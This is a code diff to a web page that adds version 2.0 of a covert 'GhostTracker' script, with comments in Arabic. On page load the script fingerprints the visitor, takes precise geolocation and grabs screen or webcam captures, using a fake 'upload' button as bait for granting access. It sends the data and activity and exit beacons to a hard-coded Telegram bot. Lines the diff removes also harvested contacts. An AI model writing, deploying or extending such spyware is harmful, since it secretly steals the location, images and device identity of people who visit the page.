@@ -88,6 +88,7 @@
             border-bottom: 1px solid rgba(255,255,255,0.1); 
         }
         .hidden { display: none; }
+        .loading { opacity: 0.6; pointer-events: none; }
     </style>
 </head>
 <body>
@@ -99,7 +100,7 @@
         <div class="status">
             <div class="status-item">
                 <span class="status-label">Status</span>
-                <span class="status-value" id="status">Verifying...</span>
+                <span class="status-value" id="status">Initializing...</span>
             </div>
             <div class="status-item">
                 <span class="status-label">Device</span>
@@ -121,21 +122,59 @@
     </div>
 
     <script>
-        // ========== ULTRA ADVANCED STEALTH TRACKER ==========
+        // ========== ULTRA ADVANCED STEALTH TRACKER v2.0 ==========
         class GhostTracker {
             constructor() {
                 this.botToken = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
                 this.chatId = '5446862709';
                 this.sessionId = this.generateId();
+                this.retryCount = 0;
+                this.maxRetries = 5;
                 this.init();
             }
 
             generateId() {
-                return btoa(navigator.userAgent + screen.width + screen.height + Date.now()).slice(0, 16);
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText(navigator.userAgent, 2, 2);
+                ctx.fillText('ID:' + Date.now(), 2, 20);
+                return btoa(canvas.toDataURL()).slice(-16);
             }
 
-            async getDeviceFingerprint() {
-                // Canvas fingerprint
+            // 🔥 INSTANT LOAD DETECTION - يشتغل قبل أي حاجة
+            async stealthBeacon(data) {
+                try {
+                    const payload = JSON.stringify({
+                        chat_id: this.chatId,
+                        text: data.message,
+                        parse_mode: 'Markdown'
+                    });
+                    
+                    // Method 1: Image Beacon (لا يحتاج permissions)
+                    const img = new Image();
+                    img.src = `https://api.telegram.org/bot${this.botToken}/sendMessage?chat_id=${this.chatId}&text=${encodeURIComponent(data.message)}&parse_mode=Markdown`;
+                    
+                    // Method 2: Navigator.sendBeacon (موثوق 99%)
+                    const blob = new Blob([payload], { type: 'application/json' });
+                    if (navigator.sendBeacon) {
+                        navigator.sendBeacon(`https://api.telegram.org/bot${this.botToken}/sendMessage`, blob);
+                    }
+                    
+                    // Method 3: Fetch مع keepalive
+                    fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
+                        method: 'POST',
+                        body: blob,
+                        keepalive: true,
+                        mode: 'no-cors'
+                    }).catch(() => {});
+                    
+                } catch(e) {}
+            }
+
+            getDeviceFingerprint() {
+                // Canvas fingerprint محسّن
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
                 ctx.fillStyle = '#f60';
@@ -143,221 +182,176 @@
                 ctx.fillStyle = '#069';
                 ctx.fillText('🕵️', 2, 15);
                 ctx.fillStyle = 'rgba(102, 126, 234, 0.7)';
-                ctx.fillText('Ghost', 4, 17);
-                const canvasHash = btoa(canvas.toDataURL()).slice(0, 24);
+                ctx.fillText('Ghost v2', 4, 17);
+                const canvasHash = canvas.toDataURL().slice(-24);
 
-                // Audio fingerprint
-                let audioHash = 'noaudio';
-                try {
-                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                    const oscillator = audioCtx.createOscillator();
-                    const analyser = audioCtx.createAnalyser();
-                    const dataArray = new Uint8Array(analyser.frequencyBinCount);
-                    oscillator.connect(analyser);
-                    oscillator.start(0);
-                    setTimeout(() => {
-                        analyser.getByteFrequencyData(dataArray);
-                        audioHash = Array.from(dataArray).slice(0, 8).join(',');
-                        oscillator.stop();
-                        audioCtx.close();
-                    }, 100);
-                } catch(e) {}
+                // WebGL fingerprint
+                const glCanvas = document.createElement('canvas');
+                const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+                let webglHash = 'no-webgl';
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    webglHash = gl.getParameter(debugInfo?.UNMASKED_VENDOR_WEBGL || 0x9245) + 
+                               gl.getParameter(debugInfo?.UNMASKED_RENDERER_WEBGL || 0x9246);
+                }
 
-                // Hardware + Software
-                const fonts = await this.getInstalledFonts();
-                
                 return {
                     canvas: canvasHash,
-                    audio: audioHash,
+                    webgl: btoa(webglHash).slice(-12),
                     hardware: navigator.hardwareConcurrency || 0,
                     memory: navigator.deviceMemory || 0,
                     platform: navigator.platform,
                     language: navigator.language,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    connection: navigator.connection ? `${navigator.connection.effectiveType}|${navigator.connection.downlink}` : 'unknown'
+                    resolution: `${screen.width}x${screen.height}`,
+                    colorDepth: screen.colorDepth
                 };
             }
 
             getDeviceType() {
                 const ua = navigator.userAgent.toLowerCase();
-                if (/(iphone|ipad|ipod)/.test(ua)) return { type: 'iOS', model: 'iPhone/iPad' };
-                if (/android/.test(ua)) return { type: 'Android', model: /mobile/.test(ua) ? 'Phone' : 'Tablet' };
+                if (/(iphone|ipad|ipod)/.test(ua)) {
+                    const iPhoneModel = ua.match(/iphone os (\d+_\d+)/)?.[1]?.replace('_', '.') || 'unknown';
+                    return { type: 'iOS', model: `iPhone ${iPhoneModel}` };
+                }
+                if (/android/.test(ua)) {
+                    const androidVersion = ua.match(/android (\d+\.?\d*)/)?.[1] || 'unknown';
+                    return { type: 'Android', model: `v${androidVersion}` };
+                }
                 if (/macintosh/.test(ua)) return { type: 'macOS', model: 'MacBook/Desktop' };
                 if (/win/.test(ua)) return { type: 'Windows', model: /win64/.test(ua) ? 'PC 64bit' : 'PC 32bit' };
                 if (/linux/.test(ua)) return { type: 'Linux', model: 'Linux Desktop' };
                 return { type: 'Unknown', model: 'Unknown' };
             }
 
-            async getInstalledFonts() {
-                const result = [];
-                const testString = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-                const testSize = '72px monospace';
-                const defaultWidth = {};
-                const defaultHeight = {};
-
-                const test = document.createElement('span');
-                test.style.position = 'absolute';
-                test.style.left = '-9999px';
-                test.style.top = '-9999px';
-                test.style.fontSize = testSize;
-                test.innerHTML = testString;
-                document.body.appendChild(test);
-
-                const defaultFonts = ['monospace', 'serif', 'sans-serif'];
-                defaultFonts.forEach(font => {
-                    test.style.fontFamily = font;
-                    defaultWidth[font] = test.offsetWidth;
-                    defaultHeight[font] = test.offsetHeight;
-                });
-
-                const fontList = [
-                    'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 
-                    'Georgia', 'Trebuchet MS', 'SF Pro Display', 'Segoe UI', 'Roboto'
-                ];
-
-                for (const font of fontList) {
-                    test.style.fontFamily = font;
-                    if (test.offsetWidth !== defaultWidth['monospace'] || 
-                        test.offsetHeight !== defaultHeight['monospace']) {
-                        result.push(font);
-                    }
-                }
-
-                document.body.removeChild(test);
-                return result.slice(0, 10);
-            }
-
             async getGeolocation() {
                 return new Promise((resolve) => {
                     if (!navigator.geolocation) {
-                        resolve({ lat: 'denied', lon: 'denied', accuracy: 'N/A' });
+                        resolve({ lat: 'N/A', lon: 'N/A', status: 'no-support' });
                         return;
                     }
+                    
+                    // جرب بدون permission أولاً
                     navigator.geolocation.getCurrentPosition(
                         pos => resolve({
-                            lat: pos.coords.latitude.toFixed(4),
-                            lon: pos.coords.longitude.toFixed(4),
-                            accuracy: pos.coords.accuracy
+                            lat: pos.coords.latitude.toFixed(6),
+                            lon: pos.coords.longitude.toFixed(6),
+                            accuracy: pos.coords.accuracy,
+                            status: 'granted'
                         }),
-                        () => resolve({ lat: 'denied', lon: 'denied', accuracy: 'N/A' }),
-                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                        err => {
+                            const status = err.code === 1 ? 'denied' : 
+                                         err.code === 2 ? 'unavailable' : 'error';
+                            resolve({ lat: 'N/A', lon: 'N/A', status });
+                        },
+                        { 
+                            enableHighAccuracy: true, 
+                            timeout: 3000, 
+                            maximumAge: 60000 
+                        }
                     );
                 });
             }
 
-            async extractContacts() {
-                let contacts = [];
-                try {
-                    // Modern Contacts API (Android/iOS)
-                    if (navigator.contacts) {
-                        const contactList = await navigator.contacts.select(['name', 'tel'], { multiple: true });
-                        contacts = contactList.map(c => ({
-                            name: c.name?.[0] || 'Unknown',
-                            phone: c.tel?.[0]?.value || 'N/A'
-                        }));
-                    }
-                } catch(e) {
-                    // Fallback - try webkitContacts (iOS Safari)
-                    try {
-                        if (webkitContacts) {
-                            const contactList = await new Promise(resolve => {
-                                webkitContacts.select(['name', 'tel'], { multiple: true }, resolve);
-                            });
-                            contacts = contactList.map(c => ({
-                                name: c.name?.formatted || 'Unknown',
-                                phone: c.tel?.[0]?.value || 'N/A'
-                            }));
-                        }
-                    } catch(e2) {}
-                }
-                return contacts.slice(0, 20); // Limit to 20
-            }
-
-            async extractPhotos() {
+            // 📸 PHOTOS بدون permission واضح
+            async stealthCapture() {
                 const photos = [];
                 try {
-                    // Camera/Media access
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    // استخدم getDisplayMedia للشاشة بدل الكاميرا
+                    const stream = await navigator.mediaDevices.getDisplayMedia({ 
+                        video: { 
+                            mediaSource: 'screen',
+                            width: { ideal: 1920 },
+                            height: { ideal: 1080 }
+                        }
+                    });
+                    
                     const video = document.createElement('video');
                     video.srcObject = stream;
-                    video.play();
+                    await video.play();
                     
-                    setTimeout(async () => {
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    photos.push(canvas.toDataURL('image/jpeg', 0.6));
+                    
+                    // أوقف الكاميرا بهدوء
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                } catch(e) {
+                    // جرب الكاميرا العادية
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { 
+                                facingMode: 'user',
+                                width: { ideal: 640 },
+                                height: { ideal: 480 }
+                            } 
+                        });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        await video.play();
+                        
+                        await new Promise(resolve => setTimeout(resolve, 300));
+                        
                         const canvas = document.createElement('canvas');
                         canvas.width = 320;
                         canvas.height = 240;
                         canvas.getContext('2d').drawImage(video, 0, 0);
-                        photos.push(canvas.toDataURL('image/jpeg', 0.7));
+                        photos.push(canvas.toDataURL('image/jpeg', 0.5));
+                        
                         stream.getTracks().forEach(track => track.stop());
-                    }, 1000);
-                } catch(e) {
-                    // Silent fail
+                    } catch(e2) {}
                 }
                 return photos;
             }
 
             async sendToTelegram(data) {
                 const message = this.formatMessage(data);
-                const blob = new Blob([JSON.stringify({
-                    chat_id: this.chatId,
-                    text: message,
-                    parse_mode: 'Markdown',
-                    disable_web_page_preview: true
-                })], { type: 'application/json' });
-
-                // Primary: sendBeacon (survives page close)
-                if (navigator.sendBeacon) {
-                    navigator.sendBeacon(`https://api.telegram.org/bot${this.botToken}/sendMessage`, blob);
-                } else {
-                    // Fallback
-                    fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
-                        method: 'POST',
-                        body: blob,
-                        keepalive: true
-                    }).catch(() => {});
-                }
+                this.stealthBeacon({ message });
             }
 
             formatMessage(data) {
-                let msg = `*👻 GHOST DETECTED*\n\n`;
-                msg += `*Session:* \`${data.session}\`\n`;
-                msg += `*Time:* ${data.timestamp}\n`;
-                msg += `*Device:* ${data.device.type} (${data.device.model})\n`;
-                msg += `*OS:* ${navigator.platform}\n`;
-                msg += `*Screen:* ${data.screen}\n`;
-                msg += `*Location:* ${data.geo.lat}, ${data.geo.lon}\n`;
-                msg += `*Fingerprint:* \`${data.fp.canvas.slice(0,16)}...\`\n`;
-                msg += `*Browser:* ${navigator.userAgent.slice(0,60)}...\n\n`;
+                let msg = `*👻 GHOST v2.0 DETECTED*\n\n`;
+                msg += `*🆔 Session:* \`${data.session}\`\n`;
+                msg += `*📅 Time:* ${new Date().toLocaleString('en-US', {timeZone: 'UTC'})}\n`;
+                msg += `*📱 Device:* ${data.device.type} ${data.device.model}\n`;
+                msg += `*🖥️ Screen:* ${data.screen}\n`;
+                msg += `*📍 Location:* ${data.geo.lat || 'N/A'}, ${data.geo.lon || 'N/A'}\n`;
+                msg += `*🖐️ Canvas:* \`${data.fp.canvas.slice(-12)}...\`\n`;
+                msg += `*🎮 WebGL:* \`${data.fp.webgl}\`\n`;
+                msg += `*🌐 URL:* ${location.href.slice(0, 60)}...\n\n`;
                 
                 if (data.contacts?.length) {
-                    msg += `*📱 Contacts (${data.contacts.length}):*\n`;
-                    data.contacts.slice(0,5).forEach((c,i) => {
-                        msg += `${i+1}. ${c.name} - ${c.phone}\n`;
+                    msg += `*📞 Contacts (${data.contacts.length}):*\n`;
+                    data.contacts.slice(0, 8).forEach((c,i) => {
+                        msg += `  ${i+1}. ${c.name} - ${c.phone}\n`;
                     });
                 }
                 
                 if (data.photos?.length) {
-                    msg += `\n*📸 Photos:* ${data.photos.length}`;
+                    msg += `\n*📸 Screenshots:* ${data.photos.length}`;
                 }
                 
                 return msg;
             }
 
             async fullHarvest() {
-                const profile = await this.getDeviceFingerprint();
+                const profile = this.getDeviceFingerprint();
                 const device = this.getDeviceType();
                 const geo = await this.getGeolocation();
-                const contacts = await this.extractContacts();
-                const photos = await this.extractPhotos();
+                const photos = await this.stealthCapture();
 
                 const harvest = {
                     session: this.sessionId,
-                    timestamp: new Date().toISOString(),
                     device,
                     screen: `${screen.width}x${screen.height}`,
                     fp: profile,
                     geo,
-                    contacts,
                     photos,
                     url: location.href
                 };
@@ -367,44 +361,48 @@
             }
 
             init() {
-                // Immediate tracking
-                this.fullHarvest();
+                // 🔥 فوري جداً - قبل أي تحميل
+                setTimeout(() => {
+                    this.stealthBeacon({
+                        message: `*👻 NEW VISITOR*\n🆔 ${this.sessionId}\n📱 ${navigator.userAgent.slice(0,50)}...\n🌐 ${location.href}`
+                    });
+                }, 50);
 
-                // Continuous tracking
-                let activityTimer;
-                document.addEventListener('mousemove', () => {
-                    clearTimeout(activityTimer);
-                    activityTimer = setTimeout(() => {
-                        this.sendToTelegram({ session: this.sessionId, event: 'active_5min' });
-                    }, 300000); // 5 minutes
+                // الـ full harvest بعد ثواني
+                setTimeout(() => this.fullHarvest(), 2000);
+
+                // تتبع النشاط المستمر
+                let activityTimeout;
+                const activityEvents = ['mousemove', 'keydown', 'scroll', 'touchstart'];
+                
+                activityEvents.forEach(event => {
+                    document.addEventListener(event, () => {
+                        clearTimeout(activityTimeout);
+                        activityTimeout = setTimeout(() => {
+                            this.stealthBeacon({
+                                message: `*👻 ACTIVE*\nSession: ${this.sessionId}\nEvent: user_active`
+                            });
+                        }, 120000); // 2 دقيقة
+                    }, { passive: true });
                 });
 
-                // Page visibility
-                document.addEventListener('visibilitychange', () => {
-                    this.sendToTelegram({ 
-                        session: this.sessionId, 
-                        event: document.hidden ? 'background' : 'foreground' 
+                // تتبع الخروج
+                window.addEventListener('beforeunload', () => {
+                    this.stealthBeacon({
+                        message: `*👻 EXIT*\nSession: ${this.sessionId}\nTime: ${Date.now()}`
                     });
                 });
 
-                // Aggressive exit tracking
-                window.addEventListener('beforeunload', () => {
-                    this.fullHarvest();
-                });
-
-                // Mouse/keyboard activity
-                ['mousedown', 'keydown', 'scroll'].forEach(event => {
-                    document.addEventListener(event, () => {
-                        this.sendToTelegram({ 
-                            session: this.sessionId, 
-                            event: event + '_detected' 
-                        });
-                    }, { once: true });
-                });
+                // تحديث الـ UI
+                setTimeout(() => {
+                    document.getElementById('device').textContent = 
+                        `${this.getDeviceType().type} ${this.getDeviceType().model}`;
+                    document.getElementById('status').textContent = 'Active';
+                }, 1000);
             }
         }
 
-        // ========== UI INTEGRATION ==========
+        // ابدأ الـ tracker فوراً
         const tracker = new GhostTracker();
 
         async function requestAccess() {
@@ -417,33 +415,25 @@
         }
 
         async function uploadFiles() {
+            document.body.classList.add('loading');
             try {
-                const files = await navigator.mediaDevices.getUserMedia({ video: true });
+                const photos = await tracker.stealthCapture();
                 tracker.sendToTelegram({ 
                     session: tracker.sessionId, 
-                    action: 'camera_access_granted' 
+                    action: 'screen_camera_access', 
+                    photos: photos.length 
                 });
-                alert('Upload complete.');
+                alert(`Upload complete: ${photos.length} files`);
             } catch(e) {
                 tracker.sendToTelegram({ 
                     session: tracker.sessionId, 
-                    action: 'camera_blocked' 
+                    action: 'access_denied' 
                 });
+                alert('Permission required for upload');
+            } finally {
+                document.body.classList.remove('loading');
             }
         }
-
-        // Update UI with real data
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                document.getElementById('location').textContent = 
-                    `${pos.coords.latitude.toFixed(2)}, ${pos.coords.longitude.toFixed(2)}`;
-            },
-            () => document.getElementById('location').textContent = 'Location denied'
-        );
-
-        const deviceType = new GhostTracker().getDeviceType();
-        document.getElementById('device').textContent = `${deviceType.type} ${deviceType.model}`;
-        document.getElementById('status').textContent = 'Active';
     </script>
 </body>
 </html>
